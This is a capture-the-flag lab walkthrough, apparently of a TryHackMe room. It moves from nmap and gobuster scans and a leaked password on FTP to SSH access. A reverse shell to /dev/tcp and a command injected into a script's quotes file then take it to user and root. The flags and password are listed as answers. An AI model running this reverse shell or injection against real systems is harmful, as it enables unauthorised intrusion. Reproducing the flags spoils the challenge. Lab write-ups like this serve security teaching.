Let's find out what his agent is up to....  

Answer the questions below

```
export IP=10.10.61.237
```

```
nmap -sC -sV -v -p- -oN scans/nmap $IP
```

![[Pasted image 20240608112028.png]]


```
gobuster dir --url $IP --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -o scans/gobuster.txt
```

![[Pasted image 20240608112609.png]]


```
ftp 10.10.157.172
```

![[Pasted image 20240609102859.png]]

```
ls -la
```

![[Pasted image 20240609102923.png]]

```
cat dad_tasks
```

![[Pasted image 20240609103324.png]]

![[Pasted image 20240609103342.png]]


![[Pasted image 20240609103430.png]]


| Question                   | Answer                                             |
| -------------------------- | -------------------------------------------------- |
| What is Weston's password? | Mydadisghostrideraintthatcoolnocausehesonfirejokes |

```
ssh weston@10.10.157.172
```


![[Pasted image 20240609103641.png]]

```
ls -la
```

![[Pasted image 20240609103819.png]]

```
sudo -l
```

![[Pasted image 20240609103852.png]]


```
sudo /usr/bin/bees
```

![[Pasted image 20240609103959.png]]

```
cat /usr/bin/bees
```

![[Pasted image 20240609104049.png]]

```
find / -type f -user cage 2>/dev/null
```

![[Pasted image 20240609104245.png]]

```
cat /opt/.dads_scripts/spread_the_quotes.py
```

![[Pasted image 20240609104314.png]]

```
cat /opt/.dads_scripts/.files/.quotes
```

![[Pasted image 20240609104403.png]]


*On Attacker machine:*
```
rlwrap nc -nlvp 1234
```

![[Pasted image 20240609104832.png]]


*On victim machine:*

```
cat > /tmp/shell.sh << EOF
```
```
#!/bin/bash
```
```
bash -i >& /dev/tcp/10.8.194.147/1234 0>&1
```
```
EOF
```
```
chmod +x /tmp/shell.sh
```
```
printf 'anything;/tmp/shell.sh\n' > /opt/.dads_scripts/.files/.quotes
```

![[Pasted image 20240609105006.png]]

![[Pasted image 20240609105019.png]]

![[Pasted image 20240609105111.png]]


| Question              | Answer                    |
| --------------------- | ------------------------- |
| What's the user flag? | THM{M37AL_0R_P3N_T35T1NG} |

```
ls -la
```

![[Pasted image 20240609105224.png]]


```
cat email_backup/*
```

![[Pasted image 20240609105259.png]]


![[Pasted image 20240609105539.png]]


```
su root
```

![[Pasted image 20240609105637.png]]

```
cd /root
```

```
cd email_backup/
```

```
cat email_1
```

![[Pasted image 20240609105855.png]]

```
cat email_2
```

![[Pasted image 20240609105940.png]]


| Question              | Answer                                |
| --------------------- | ------------------------------------- |
| What's the root flag? | THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3} |
